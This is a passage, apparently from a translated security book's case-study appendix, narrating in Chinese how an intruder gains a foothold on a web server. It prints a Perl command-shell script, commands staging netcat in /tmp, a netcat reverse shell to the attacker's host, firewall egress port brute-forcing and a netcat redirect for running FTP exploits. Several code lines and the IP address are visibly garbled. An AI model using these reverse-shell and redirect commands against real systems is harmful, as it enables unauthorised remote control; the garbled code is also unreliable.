
他的意图是在 Web 服务器上设置一个 `netcat`，与他互联网上的机器通信，并运行他输入的任何命令，而不再需要使用 `query_email.cgi` 程序（该程序会记录了他的命令）。他写了以下 Perl 脚本：

```perl
#!/usr/bin/perl

open STDERR, ">STDOUT"; \$ENV{PATH}=":/tmp";

while (<>) { chop;

s/\\\\/ ? system($_) && print "$\n" : eval or print "@\n"

print "webserver";
```

# 附录 D：案例

这个程序是 Perl 在空间利用和模糊性方面的一个示例。第一个程序确保所有错误信息都发送到 `stdout`，并将 `/tmp` 目录（黑客存储其程序的地方）添加到 `PATH` 环境变量中。它继续读取输入行。如果行以 `$` 符号开头，则去掉该符号并由 `/bin/sh` 执行命令。如果不是以 `$` 开头，则命令被假设为 Perl 代码，并在 Perl 脚本中使用 `eval` 运行。无论使用哪种方法，任何错误代码都会输出。因此，黑客可以轻松地运行 Perl 或外部命令。

我们像之前上传 `netcat` 二进制文件一样上传了该 Perl 脚本——将它们复制到 `/tmp` 并使它们都具有可执行权限：

```
perl -e 'rename /tmp/uploaded/gotcha.7726", /tmp/nc"
rename /tmp/uploaded/gotcha.7782", /tmp/cmdshell"
chmod 0700, /tmp/nc", /tmp/cmdshell"
```

随后他在他的机器上运行了以下命令：

```
hackerbox# nc -vv -p 6666 205.285.79.99 -1
```

这在他的机器 `205.285.79.99` 的 `6666` 端口上设置了一个服务器，该服务器将监听连接并将他的键盘和屏幕与连接的远端连接。从这里他将输入命令，这些命令将由 `cmdshell` 执行，他在 Web 服务器上如下运行该程序：

```
nc -e /tmp/cmdshell 205.285.79.99 6666
```

# 防火墙干扰

黑客发现并没有如预期那样看到连接到他的 `netcat` 服务器，Web 服务器上的 `netcat` 客户端无法建立出连接。显然，Web 服务器前的防火墙不仅被设置为拒绝除特定端口外的指向 Web 服务器的连接，还被设置为只允许某些连接通过防火墙。该防火墙的配置非常偏执。

因此，黑客决定为 `netcat` 客户端尝试各种源/目的端口，使用常用端口如 lotus nodes、`cvpserver`、`squid`、`aol`、`cfengine`、`vnc`、Xil、irc、cucme、amanda 以及 `pcanywhere`。通过暴力测试（通过他上传的 Perl 脚本自动化），他发现如果他的源端口是 `8080`，他就能穿透防火墙——这是一个通常用于二级 Web 服务器的端口。也许在某时刻该机器上运行过额外的 Web 服务器，在服务器停用后该端口从未被关闭。

注意：尽管很有吸引力，但他无法使用任何低端口（`<1024`），因为 Web 服务器不是以 root 身份运行的，而绑定低端口需要 root 权限。

的确，机器上运行着一些从防火墙外部无法访问的服务。

## 攻击 FTP 服务器

黑客拥有很多脚本可以允许他攻击有漏洞的 FTP 服务器。为了确定运行的是哪种 FTP 服务器，他再次转向了那个可靠的“瑞士军刀”——`netcat`：

```
webserver> nc localhost 21
220 silly.example.org FTP server ready.
USER anonymous
530 User anonymous unknown.
```

没有多少有用的信息，但足以假设 `21` 端口确实是一个 FTP 服务器，而且它不允许匿名登录。他尝试使用之前发现的 `adguest` 账户，并成功登录了 FTP。这一天看起来很有希望。

黑客拥有一些 FTP 守护进程漏洞脚本，他想要运行这些脚本看看是否能获得 root 权限。他决定从本地机器运行脚本是最简单的，而不是将它们上传到 Web 服务器。然后，他通过 `netcat` 建立了一个快速重定向：

```
hackerbox# nc -e /ftp_exploit -p 6666 -1
webserver> echo '#!/bin/sh' >> /tmp/redir
webserver> echo 'nc localhost 21' >> /tmp/redir
webserver> chmod 0700, "/tmp/redir"
webserver> $ nc -e /tmp/redir 205.285.79.99 6666
```
